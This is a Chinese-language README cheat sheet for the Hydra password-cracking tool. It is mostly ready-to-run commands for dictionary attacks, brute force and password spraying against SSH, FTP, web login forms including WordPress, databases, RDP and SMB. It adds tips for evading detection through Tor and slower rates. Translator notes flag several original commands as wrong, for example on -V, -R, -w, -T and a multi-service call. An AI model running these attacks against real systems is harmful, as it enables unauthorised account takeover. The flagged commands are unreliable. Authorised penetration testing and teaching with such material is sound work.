# 🔓 Hydra 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    快速网络登录口令测试工具
```

<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="暴力破解">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="协议">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="网络">
</p>

<p align="center">
  <b>🔑 广泛使用的并行网络登录口令测试工具</b>
</p>

---

## 📋 目录

- [简介](#-introduction)
- [安装](#-installation)
- [基本语法](#-basic-syntax)
- [支持的协议](#-supported-protocols)
- [SSH 攻击](#-ssh-attacks)
- [FTP 攻击](#-ftp-attacks)
- [HTTP 表单攻击](#-http-form-attacks)
- [数据库攻击](#-database-attacks)
- [远程桌面攻击](#-remote-desktop-attacks)
- [其他服务](#-other-services)
- [字典与密码](#-wordlists--passwords)
- [高级选项](#-advanced-options)
- [实际场景示例](#-real-world-examples)
- [快速参考](#-quick-reference)
- [使用技巧与最佳实践](#-tips--best-practices)
- [资源](#-resources)

---

<a id="-introduction"></a>
## 🎯 简介

**Hydra**（THC-Hydra）是一款快速、灵活的在线口令测试工具，支持多种协议，并通过并行连接提高速度。

### 主要特性

| 特性 | 说明 |
|---------|-------------|
| **50+ 种协议** | SSH、FTP、HTTP、RDP、SMB 等 |
| **支持并行** | 同时建立多个连接 |
| **灵活** | 自定义请求头、Cookie 和代理 |
| **恢复** | 保存并恢复测试会话 |
| **跨平台** | Linux, Windows, macOS |

### 攻击类型

| 类型 | 说明 |
|------|-------------|
| **字典攻击** | 尝试字典中的密码 |
| **暴力破解** | 生成所有组合 |
| **密码喷洒（Password Spray）** | 对多个用户尝试同一个密码 |
| **撞库（Credential Stuffing）** | 用户名与密码配对 |

---

<a id="-installation"></a>
## 📥 安装

### Kali Linux（预安装）
```bash
hydra -h
```

### Ubuntu/Debian
```bash
sudo apt install hydra
```

### 从源码构建
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

### macOS（Homebrew）
```bash
brew install hydra
```

### 验证安装

> **译注：** `-V` 显示每次尝试的用户名与密码，不是版本选项；`-t` 限制并发任务，不限制总尝试数，也不能保证避免账户锁定。参见 [官方参数帮助源码](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c)。
```bash
hydra -h
hydra -V
```

---

<a id="-basic-syntax"></a>
## ⌨️ 基本语法

### 通用语法
```bash
hydra [options] target service
```

### 常用选项

| 选项 | 说明 |
|--------|-------------|
| `-l` | 单个用户名 |
| `-L` | 用户名列表 |
| `-p` | 单个密码 |
| `-P` | 密码列表 |
| `-C` | 以冒号分隔的文件（user:pass） |
| `-t` | 并发任务数（默认：16） |
| `-s` | 端口号 |
| `-o` | 输出文件 |
| `-f` | 找到首个有效凭据对后停止 |
| `-V` | 详细模式（-V 的准确含义见译注） |
| `-vV` | 更详细的输出 |
| `-d` | 调试模式 |

### 快速入门
```bash
# 单个用户，密码列表
hydra -l admin -P passwords.txt target ssh

# 用户列表，单个密码
hydra -L users.txt -p password123 target ssh

# 同时使用两个列表
hydra -L users.txt -P passwords.txt target ssh
```

---

<a id="-supported-protocols"></a>
## 📡 支持的协议

### 完整协议列表

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

<a id="-ssh-attacks"></a>
## 🔐 SSH 攻击

### 基本 SSH 攻击
```bash
# 单个用户
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# 多个用户
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# 指定端口
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

### 带选项的 SSH 测试
```bash
# 原文称限制尝试以避免锁定（-t 实际限制并发）
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# 首次成功后停止
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# 详细输出
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

### SSH 密钥身份验证

> **译注：** `sshkey` 将输入作为私钥文件路径读取；`-x` 生成的字符组合不是私钥文件，不能据此示例认定正在测试弱密钥。参见 [官方 sshkey 实现](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-sshkey.c)。
```bash
# 使用私钥（原文称检查弱密钥，示例限制见译注）
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

<a id="-ftp-attacks"></a>
## 📂 FTP 攻击

### 基本 FTP 攻击
```bash
# FTP 暴力破解
hydra -l admin -P passwords.txt ftp://192.168.1.1

# 匿名 FTP 检查
hydra -l anonymous -p anonymous ftp://192.168.1.1

# 多个用户
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### FTPS（通过 SSL 保护的 FTP）
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

<a id="-http-form-attacks"></a>
## 🌐 HTTP 表单攻击

### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# 格式:
# "/path:params:failure_string"
```

### HTTP-POST-FORM（常用）

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### 表单攻击语法

```
"/page:POST_params:Failure_string"

其中：
- ^USER^ = 用户名占位符
- ^PASS^ = 密码占位符
- Failure_string = 登录失败时显示的文本
```

### 基于成功标记的检测

```bash
# 使用 S= 指定成功字符串，代替失败字符串
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

### 携带 Cookie

> **语法说明：** 当前模块要求条件字符串位于末尾，值中的冒号还需按模块规则转义。下方原文 Cookie 示例的分隔和顺序需核对，不能照抄即认为有效。失败匹配还可能误报，具体文本应与实际响应对应。参见 [官方 HTTP 表单模块说明](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-http-form.c)。

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

### HTTP Basic 身份验证

```bash
# HTTP Basic 身份验证
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

### HTTP 代理

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

<a id="-database-attacks"></a>
## 🗄️ 数据库攻击

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# 指定端口
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

### Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

### Oracle

```bash
# Oracle SID 攻击
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# Oracle 监听器
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

<a id="-remote-desktop-attacks"></a>
## 🖥️ 远程桌面攻击

### RDP（Windows 远程桌面）

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# 限制并发任务数（RDP 较慢）
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

### VNC

```bash
# VNC（仅密码）
hydra -P passwords.txt vnc://192.168.1.1

# 指定 VNC 版本（原文表述，-s 实际指定端口）
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

<a id="-other-services"></a>
## 🔧 其他服务

### SMB（Windows 共享）

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

### SMTP

```bash
# SMTP 身份验证
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# SMTP 枚举
hydra -L users.txt smtp-enum://192.168.1.1
```

### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

<a id="-wordlists--passwords"></a>
## 📚 字典与密码

### 常用字典

```bash
# Kali Linux 中的位置
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# SecLists 密码字典
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

### 密码生成（-x）

> **译注：** `a`、`A`、`1` 是预定义字符集标记；其他字符按字面加入。因此 `!` 不代表全部特殊字符。参见 [官方字符集帮助](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c)。

```bash
# 生成密码：min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # 4-6 个小写字母
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # 4-6 个大写字母
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # 4-6 个数字
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # 混合指定

# 字符集选项：
# a = 小写字母    A = 大写字母
# 1 = 数字      ! = 字面字符 !（见译注）
```

### 冒号分隔文件（-C）

```bash
# user:password 格式
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

### 自定义用户名与密码测试

```bash
# 空密码
hydra -l admin -e n 192.168.1.1 ssh

# 尝试将用户名作为密码
hydra -l admin -e s 192.168.1.1 ssh

# 尝试将反转后的用户名作为密码
hydra -l admin -e r 192.168.1.1 ssh

# 所有特殊检查
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

<a id="-advanced-options"></a>
## ⚡ 高级选项

### 输出与日志

```bash
# 将结果保存到文件
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# JSON 输出
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

### 恢复测试

> **译注：** `-R` 恢复已有的中断会话，不是保存选项。原文“保存会话”命令的说明不准确。参见 [官方恢复说明](https://github.com/vanhauser-thc/thc-hydra/blob/master/README)。

```bash
# 原文称保存会话以便恢复（-R 实际用于恢复）
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# 恢复中断的测试
hydra -R
```

### 代理支持

> **译注：** 官方区分 HTTP 服务代理的 `HYDRA_PROXY_HTTP` 与其他服务使用的 `HYDRA_PROXY`；后者的通用 HTTP CONNECT 语法也不等于原文的 `http://` 写法。后面的 HTTP/Tor 示例须结合模块支持核对，参见 [官方代理说明](https://github.com/vanhauser-thc/thc-hydra/blob/master/README)。

```bash
# HTTP 代理
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# SOCKS 代理
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

### 性能调优

> **译注：** `-w` 是响应等待时间，`-W` 才是每个任务的连接间隔；`-T` 是多目标模式下的总体并发任务数，不是连接超时。原文隐蔽性示例中的 `-w` 也不能当作尝试间隔。参见 [官方参数帮助](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c)。

```bash
# 并发任务数（默认：16）
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# 原文称尝试间隔（-w 实际为响应等待时间）
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# 原文称连接超时（-T 实际限制总体并发任务数）
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

### 多个目标

```bash
# 从文件读取
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

<a id="-real-world-examples"></a>
## 🎬 实际场景示例

### 示例 1：SSH 暴力破解
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

### 示例 2：Web 登录表单
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

### 示例 3：WordPress 登录
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

### 示例 4：多个服务

> **译注：** 官方调用语法每次指定一个服务；`ssh ftp mysql` 不能按原文说明同时测试三种服务。代码保留原样，参见 [官方调用语法](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c)。
```bash
# 扫描同一主机的多个服务（原文示例不符合单服务调用语法）
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

### 示例 5：密码喷洒
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

### 示例 6：使用代理或 Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

### 示例 7：HTTP Basic 身份验证（管理面板）
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

### 示例 8：RDP 攻击（谨慎操作！）
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

<a id="-quick-reference"></a>
## 📊 快速参考

### 核心命令

| 任务 | 命令 |
|------|---------|
| SSH 攻击 | `hydra -l user -P pass.txt ssh://target` |
| FTP 攻击 | `hydra -l user -P pass.txt ftp://target` |
| HTTP POST 表单 | `hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"` |
| RDP 攻击 | `hydra -l user -P pass.txt rdp://target` |
| 保存输出 | `hydra ... -o results.txt` |
| 恢复测试 | `hydra -R` |

### 常用选项

| 选项 | 说明 |
|--------|-------------|
| `-l/-L` | 用户名/用户名列表 |
| `-p/-P` | 密码/密码列表 |
| `-C` | user:pass 文件 |
| `-t` | 并发任务 |
| `-s` | 端口 |
| `-f` | 成功后停止 |
| `-V` | 详细输出 |
| `-o` | 输出文件 |
| `-x` | 生成密码 |
| `-e nsr` | 尝试空密码、相同用户名、反转用户名 |

---

<a id="-tips--best-practices"></a>
## 💡 使用技巧与最佳实践

### 性能建议

1. **对敏感服务限制并发任务数**
   ```bash
   # RDP、SMB：使用较低并发任务数
   hydra -t 1 ...
   
   # SSH：使用适中并发任务数
   hydra -t 4 ...
   
   # Web 表单：原文建议可以提高并发任务数
   hydra -t 16 ...
   ```

2. **使用针对性字典**
   ```bash
   # 原文建议优先于 rockyou.txt 的字典：
   # - 最常见的 1000 个密码
   # - 默认凭据
   # - 公司特有的密码
   ```

3. **先检查账户锁定策略**
   ```bash
   # 先使用小字典测试
   hydra -l admin -P small.txt -t 1 target ssh
   ```

### 隐蔽性建议

```bash
# 增加延迟（此处 -w 的实际作用见译注）
hydra -l admin -P passwords.txt -w 30 target ssh

# 较低并发任务数
hydra -l admin -P passwords.txt -t 2 target ssh

# 经由代理
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

## ⚠️ 法律免责声明

> **警告：** Hydra 是功能强大的攻击工具，仅可用于 **获得授权的测试**.
> 
> - ✅ 测试您拥有的系统
> - ✅ 获得明确书面许可后测试
> - ✅ 用于获得授权的渗透测试
> - ❌ 未经授权不得进行攻击
> - ❌ 未经许可的暴力破解属于违法行为
> 
> **未经授权的访问尝试属于违法行为，可能导致刑事指控。**

---

<a id="-resources"></a>
## 📚 资源

### 官方资源
- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra 手册](https://github.com/vanhauser-thc/thc-hydra/blob/master/README)

### 字典
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [默认凭据](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### 相关速查表
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)

---

<p align="center">
  <b>🔓 掌握网络登录口令测试！</b><br>
  <i>始终先取得授权</i>
</p>
